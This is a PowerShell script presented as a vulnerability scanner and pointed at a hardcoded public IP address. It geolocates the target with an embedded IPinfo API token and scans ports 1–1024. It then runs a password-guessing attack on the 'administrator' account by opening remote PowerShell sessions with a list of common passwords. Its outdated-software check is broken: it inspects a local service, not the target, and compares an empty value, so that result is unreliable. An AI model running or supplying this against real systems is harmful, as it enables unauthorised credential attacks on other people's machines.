# Define the IP address to test
$ipAddress = "66.51.112.47"  

# Define the range of ports to scan
$startPort = 1
$endPort = 1024

# List of weak passwords for dictionary attack
$weakPasswords = @("password", "123456", "admin", "root", "letmein")

# Define IPinfo API token
$ipinfoToken = "da856a93b27de5"  # Replace with your IPinfo API token

# Function to scan a single port
function Test-Port {
    param (
        [string]$ipAddress,
        [int]$port
    )

    $tcpClient = New-Object System.Net.Sockets.TcpClient
    try {
        $tcpClient.Connect($ipAddress, $port)
        $tcpClient.Close()
        return $true
    } catch {
        return $false
    }
}

# Function to check for outdated software (Example: Check for specific Windows service version)
function Check-OutdatedSoftware {
    param (
        [string]$service
    )

    $version = (Get-Service -Name $service).DisplayName -match "\d+.\d+.\d+.\d+" | Out-Null
    if ($version -lt "10.0.0.0") {
        return $true
    } else {
        return $false
    }
}

# Function to perform dictionary attack on a service (Example: RDP)
function Test-WeakPassword {
    param (
        [string]$ipAddress,
        [string]$username,
        [array]$passwords
    )

    foreach ($password in $passwords) {
        try {
            $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
            $session = New-PSSession -ComputerName $ipAddress -Credential $credential -ErrorAction Stop
            Remove-PSSession $session
            return $password
        } catch {
            continue
        }
    }
    return $null
}

# Function to get geolocation information
function Get-Geolocation {
    param (
        [string]$ipAddress,
        [string]$apiToken
    )

    $url = "https://ipinfo.io/$ipAddress?token=$apiToken"
    $response = Invoke-RestMethod -Uri $url -Method Get
    return $response
}

# Get geolocation information
Write-Host "Getting geolocation information for $ipAddress..."
$geoInfo = Get-Geolocation -ipAddress $ipAddress -apiToken $ipinfoToken

if ($geoInfo) {
    Write-Host "Geolocation information for ${ipAddress}:"
    Write-Host "IP: $($geoInfo.ip)"
    Write-Host "City: $($geoInfo.city)"
    Write-Host "Region: $($geoInfo.region)"
    Write-Host "Country: $($geoInfo.country)"
    Write-Host "Location: $($geoInfo.loc)"
    Write-Host "Organization: $($geoInfo.org)"
} else {
    Write-Host "Failed to retrieve geolocation information for $ipAddress"
}

# Perform the port scan
Write-Host "Scanning IP address $ipAddress for open ports..."
for ($port = $startPort; $port -le $endPort; $port++) {
    if (Test-Port -ipAddress $ipAddress -port $port) {
        Write-Host "Port $port is open on $ipAddress"
    }
}

# Check for outdated software
Write-Host "Checking for outdated software on $ipAddress..."
$service = "wuauserv"  # Example service
if (Check-OutdatedSoftware -service $service) {
    Write-Host "$service is outdated on $ipAddress"
} else {
    Write-Host "$service is up-to-date on $ipAddress"
}

# Perform dictionary attack for weak passwords
Write-Host "Testing for weak passwords on $ipAddress..."
$username = "administrator"  # Example username
$weakPassword = Test-WeakPassword -ipAddress $ipAddress -username $username -passwords $weakPasswords
if ($weakPassword) {
    Write-Host "Weak password found for ${username}: ${weakPassword}"
} else {
    Write-Host "No weak passwords found for ${username}"
}

Write-Host "Vulnerability scan complete."
